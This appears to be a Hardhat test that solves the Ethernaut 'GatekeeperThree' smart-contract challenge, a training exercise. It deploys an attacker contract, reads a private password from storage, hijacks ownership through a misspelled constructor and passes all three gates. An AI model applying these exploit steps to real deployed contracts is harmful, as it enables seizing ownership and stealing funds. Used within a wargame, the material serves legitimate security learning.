import { expect } from "chai";
import { ethers } from "hardhat";

describe("GatekeeperThree", async function () {

  it("Should has the attacker as entrant", async function () {
    //setup+
    const [deployer, attacker] = await ethers.getSigners()
    const GatekeeperThree = await ethers.getContractFactory("GatekeeperThree");
    const gatekeeperThree = await GatekeeperThree.deploy();
    await gatekeeperThree.deployed();
    //setup-

    //1.Deploy attacker
    const GatekeeperThreeAttacker = await ethers.getContractFactory("GatekeeperThreeAttacker");
    const gatekeeperThreeAttacker = await GatekeeperThreeAttacker.connect(attacker).deploy(gatekeeperThree.address);

    await gatekeeperThreeAttacker.deployed();


    //2.Create SimpleTrick contract
    await gatekeeperThree.connect(attacker).createTrick()

    //3.Get address
    const simpleTrickAddr = await gatekeeperThree.trick()

    //4.Get password
    const password = await ethers.provider.getStorageAt(simpleTrickAddr, 2)
    expect(await gatekeeperThree.allow_enterance()).to.be.eq(false)

    //5.Turn allow_entrance to true
    await gatekeeperThree.connect(attacker).getAllowance(password)

    expect(await gatekeeperThree.allow_enterance()).to.be.eq(true)

    //6.Send ether for gate 3
    await attacker.sendTransaction({ to: gatekeeperThree.address, value: ethers.utils.parseEther("0.0011") })

    //7.Make gatekeeperThreeAttacker owner
    await gatekeeperThreeAttacker.callConstruct0r();

    //8.Call enter through the attacker
    await gatekeeperThreeAttacker.callEnter()
    const entrant = await gatekeeperThree.entrant()

    expect(entrant).to.be.eq(attacker.address)
  });

});
